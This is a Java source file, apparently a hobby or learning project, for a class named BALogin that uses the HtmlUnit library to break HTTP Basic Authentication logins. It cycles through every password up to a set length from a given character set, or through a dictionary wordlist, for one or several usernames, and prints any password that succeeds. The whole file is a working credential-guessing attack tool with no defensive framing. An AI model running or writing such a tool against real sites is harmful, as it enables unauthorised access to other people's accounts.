package com.company;


import com.gargoylesoftware.htmlunit.DefaultCredentialsProvider;
import com.gargoylesoftware.htmlunit.FailingHttpStatusCodeException;
import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.html.HtmlForm;
import com.gargoylesoftware.htmlunit.html.HtmlPage;

import java.io.IOException;
import java.net.MalformedURLException;
import java.util.ArrayList;
import java.util.Scanner;

public class BALogin {

    String url;

    String username;
    ArrayList<String> usernames;
    ArrayList<String> dictionary;
    int maxLength;
    String characterSpace;

    boolean manyUsernames;

    WebClient client;
    HtmlPage page;
    HtmlForm form;

    Scanner scanner;

    boolean isBrute;
    boolean found;

    public BALogin(String url, String username, String characterSpace, int maxPasswordLength) {
        this.url = url;
        this.username = username;
        this.characterSpace = characterSpace;
        this.maxLength = maxPasswordLength;
        manyUsernames = false;
        isBrute = true;
    }

    public BALogin(String url, ArrayList<String> usernames, String characterSpace, int maxPasswordLength) {
        this.url = url;
        this.usernames = usernames;
        this.characterSpace = characterSpace;
        this.maxLength = maxPasswordLength;
        manyUsernames = true;
        isBrute = true;
    }

    public BALogin(String url, String username, ArrayList<String> words) {
        this.url = url;
        this.username = username;
        this.dictionary = words;
        manyUsernames = false;
        isBrute = false;
    }

    public BALogin(String url, ArrayList<String> usernames, ArrayList<String> words) {
        this.url = url;
        this.usernames = usernames;
        this.dictionary = words;
        isBrute = false;
        manyUsernames = true;
    }

    public void setup() {
        found = false;
        scanner = new Scanner(System.in);

        if (isBrute) {
            if (!manyUsernames) {
                for (int i = 0; i < maxLength; i++) {
                    if (!found) {
                        startBruteAttempts("", i + 1);
                    }
                }
            } else {
                for (String n : usernames) {
                    username = n;

                    for (int i = 0; i < maxLength; i++) {
                        if (!found) {
                            startBruteAttempts("", i + 1);
                        }
                    }
                }
            }
        } else {

            if (!manyUsernames) {
                startDictAttempts();
            } else {
                for(String n : usernames){
                    username = n;
                    startDictAttempts();
                }
            }
        }
    }

    public void startDictAttempts() {

        for (int i = 0; i < dictionary.size(); i++) {
            client = newWebClient(username, dictionary.get(i));

            try {
                HtmlPage page = (HtmlPage) client.getPage(url);

                System.out.println("Success with username " + username + "! " + "Password is " + dictionary.get(i));
                break;
            } catch (IOException e) {
                e.printStackTrace();
            } catch (FailingHttpStatusCodeException e) {
                System.out.println("Failed attempt with: " + username + ", " + dictionary.get(i));

            }

        }
    }

    public void startBruteAttempts(String curr, int length) {

        client = newWebClient(username, curr);

        try {
            HtmlPage page = (HtmlPage) client.getPage(url);

            System.out.println("Success with username " + username + "! " + "Password is " + curr);
            found = true;
            return;

        } catch( MalformedURLException e ){
            System.out.println("Invalid URL. Try again: ");
            url = scanner.next();
            startBruteAttempts("", 1);
        }catch (IOException e) {
            e.printStackTrace();
        } catch (FailingHttpStatusCodeException e) {
            System.out.println("Failed attempt with: " + username + ", " + curr);

        }

        if (curr.length() == length) {
            // Else add each letter from the alphabet to new strings and process these new strings again
        } else {
            if (!found) {
                for (int i = 0; i < characterSpace.length(); i++) {
                    String oldCurr = curr;
                    curr += characterSpace.charAt(i);
                    startBruteAttempts(curr, length);
                    curr = oldCurr;
                }
            }
        }


    }

    protected WebClient newWebClient(String username, String password) {
        WebClient client = new WebClient();
        DefaultCredentialsProvider provider = new DefaultCredentialsProvider();
        provider.addCredentials(username, password);
        client.setCredentialsProvider(provider);
        return client;
    }
}
